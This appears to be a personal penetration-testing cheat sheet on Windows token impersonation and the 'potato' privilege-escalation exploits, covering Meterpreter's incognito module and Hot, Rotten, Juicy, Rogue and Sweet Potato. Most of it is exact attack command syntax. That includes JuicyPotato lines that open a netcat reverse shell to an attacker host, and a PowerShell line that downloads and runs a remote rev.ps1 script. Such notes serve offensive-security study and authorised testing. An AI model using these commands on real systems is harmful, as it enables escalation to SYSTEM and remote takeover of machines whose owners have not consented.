Token impersonation and potato attack:
	Basics:
		Tokens:
			Temp keys that allows us to access a system/network without credentials. They are like COOKIES,but for windows.
			Two types of tokens:
				Delegate:
					These are created for ‘interactive’ logons, such as logging into the machine or connecting to it via Remote Desktop. 
				Impersonate:
					These are created for ‘non-interactive’ sessions, such as attaching a network drive or a domain logon script.
				When a user logs off, their delegate token is reported as an impersonate token, but will still hold all of the rights of a delegate token.
		finding tokens:
			C:\> whoami /priv => it will show prvileges
			meterpreter> getprivs
		Vulnerable tokens:
			SEImpersonatePrivilege
			SEAssignPrimaryToken
	Using Meterpreter:(automated way)
		load incognito => a module foe token exploitaion and impersonation
		list_tokens -u => lists the availabel tokens
		Impersonate_token "token_name" => it will impersonate the specified token 
	Potato Exploits:(manual way)
		Hot-Potato->RottenPotato->RottenPotatoNG->LonelyPotato->JuicyPotato->RoguePotato->JuicyPotato_2
		HotPotato:(https://github.com/foxglovesec/Potato)
			For Windows 7/8/10 and Server 2008/2012
			usage:
				no longer in use
				executable => https://github.com/foxglovesec/Potato
				powershell script =>  https://github.com/Kevin-Robertson/Tater
					it is PS version of potato exploit
		RottenPotato:(https://github.com/foxglovesec/RottenPotato)
			aka ms16_075_reflection in metasploit
			Usage:
				no longer in use => github page says shift to RottenPotatoNG
		RottenPotatoNG:(https://github.com/breenmachine/RottenPotatoNG)
			Basically RottenPotatoNG is version2 of RottenPotato
			Usage:
				After having a meterpreter shell with incognito mode loaded:
					MSFRottenPotato.exe t c:\windows\temp\test.bat
		LonelyPotato:(https://github.com/decoder-it/lonelypotato)
			Lonely Potato was the adaptation of Rotten Potato without relying on meterpreter and the “incognito” module
			usage:	
				no longer in use. The github link says "shift to juicy-potato"		
		JuicyPotato:(https://github.com/ohpe/juicy-potato/releases)
			aka ms16_075_reflection_juicy in metasploit
			If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
			Usage:
				JuicyPotato -l lport -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe lhost lport" -t * => to use nc.exe
				JuicyPotato.exe -l lport -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://lhost:8080/rev.ps1')" -t * => to use ps reverse shell
				flags:
					-l lport
					-p c:\windows\system32\cmd.exe
						we always use "\system32\cmd.exe" is SYSTEM shell
					-a "arguments to pass to program(-p)"
						example:
							-a "/c c:\users\public\desktop\nc.exe -e cmd.exe lhost lport"
					-t *
						it defines createprocess call:
							t => CreateProcessWithTokenW
							u => CreateProcessAsUser
							* => both
					-c {clsid_value}:
						https://ohpe.it/juicy-potato/CLSID/ => list of clsids based on OS
						default => {4991d34b-80a1-4291-83b6-3328366b9097}
					Optional:
						-m <ip>: COM server listen address (default 127.0.0.1)
						-k <ip>: RPC server ip address (default 127.0.0.1)
						-n <port>: RPC server listen port (default 135)
						-z only test CLSID and print token's user
		RoguePotato:(https://github.com/antonioCoco/RoguePotato)
			Released on 11 may 2020
			If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
			Usage:
				.\RoguePotato.exe -r lhost -e "C:\windows\system32\cmd.exe /c {command}" -l lport
				flags:
					-r lhost
					-e program
					-l lport
					-c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
		SweetPotato:(https://github.com/CCob/SweetPotato)
			Released on 13 may 2020
			The tool was designed to be used with Cobalt Strike’s execute-assembly command, so it carries no baggage in the form of dependencies
			Usage:
				flags:
					-c, --clsid=VALUE          CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)
					-m, --method=VALUE         Auto,User,Thread (default Auto)
					-p, --prog=VALUE           Program to launch (default cmd.exe)
					-a, --args=VALUE           Arguments for program (default null)
					-e, --exploit=VALUE        Exploit mode [DCOM|WinRM|PrintSpoofer(default)]
					-l, --listenPort=VALUE     COM server listen port (default 6666)
					-h, --help                 Display this help
		JuicyPotato_2:(https://github.com/decoder-it/juicy_2)
			Released on 30 may 2020
			JuicyPotato for Win10 > 1803 & Win Server 2019
			IDK the difference between juicy2 and RoguePotato, consider the following links:
				https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
				https://2020.romhack.io/dl-2020/RH2020-slides-Cocomazzi.pdf
		Note:
			CLSID is a globally unique identifier that identifies a COM class object. It is an identifier like UUID.


	